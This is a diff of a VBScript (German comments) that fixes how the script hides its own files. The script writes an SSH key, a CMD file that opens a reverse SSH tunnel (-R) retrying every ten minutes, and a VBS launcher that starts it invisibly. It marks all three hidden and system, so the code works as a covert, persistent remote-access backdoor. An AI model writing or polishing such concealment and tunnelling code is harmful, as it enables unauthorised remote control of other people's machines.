@@ -46,7 +46,7 @@ Dim keyContent
         keyFile.Write keyContent
         keyFile.Close
         Set fso = CreateObject("Scripting.FileSystemObject")
-fso.GetFile(keyPath).Attributes = 6
+        fso.GetFile(keyPath).Attributes = 6
     End If
 
     ' CMD-Datei für SSH-Verbindung mit -R und ServerAliveInterval und Wiederholung alle 10 Minuten, 5 Versuche
@@ -63,7 +63,7 @@ fso.GetFile(keyPath).Attributes = 6
         file.WriteLine "goto loop"
         file.Close
         Set fso = CreateObject("Scripting.FileSystemObject")
-fso.GetFile(keyPath).Attributes = 6
+        fso.GetFile(cmdPath).Attributes = 6
     End If
 
     ' VBS-Datei, die versteckt das CMD startet (einmalig)
@@ -74,7 +74,7 @@ fso.GetFile(keyPath).Attributes = 6
         vbsFile.WriteLine "WshShell.Run Chr(34) & """ & cmdPath & """ & Chr(34), 0, False"
         vbsFile.Close
         Set fso = CreateObject("Scripting.FileSystemObject")
-fso.GetFile(keyPath).Attributes = 6
+        fso.GetFile(vbsPath).Attributes = 6
     End If
 
     ' Nach dem Erstellen: VBS-Skript sofort ausführen
